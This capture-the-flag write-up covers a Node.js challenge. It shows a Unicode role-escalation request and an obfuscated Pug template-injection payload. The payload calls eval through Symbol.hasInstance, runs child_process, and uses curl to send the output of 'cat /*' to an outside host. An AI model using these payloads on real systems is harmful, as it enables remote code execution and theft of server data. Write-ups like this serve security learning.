# NodeJS Enthusiast

This is my first time using Node.js, and I am pretty sure that this code is bug free

## Author
daffainfo

## Difficulty
Medium

## Writeup
1. Change the role from user to admin

```
POST /profile HTTP/1.1
Host: 127.0.0.1:21291
Content-Length: 11
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=xxxx

role=àdmin
```

2. SSTI in Pug JS using `Symbol.hasInstance` and then call `eval` function

```
#{x = 'global.p\x72ocess.mainModule.constructor._load\x28\x27child_p\x72ocess\x27\x29.exec\x28"curl+daffa.info:1337+-d\s=\x60cat+/*\x60"\x29'}
#{x instanceof { [Symbol.hasInstance]: eval } }
```

The final poc would be something like this:

```
GET /admin?name=%23{x='global.p\x72ocess.mainModule.constructor._load\x28\x27child_p\x72ocess\x27\x29.exec\x28"curl+daffa.info:1337+-d\s=\x60cat+/*\x60"\x29'}%23{x+instanceof+{+[Symbol.hasInstance]:+eval+}} HTTP/1.1
Host: 127.0.0.1:21291
Cookie: connect.sid=xxxx
```

Reference:
- https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses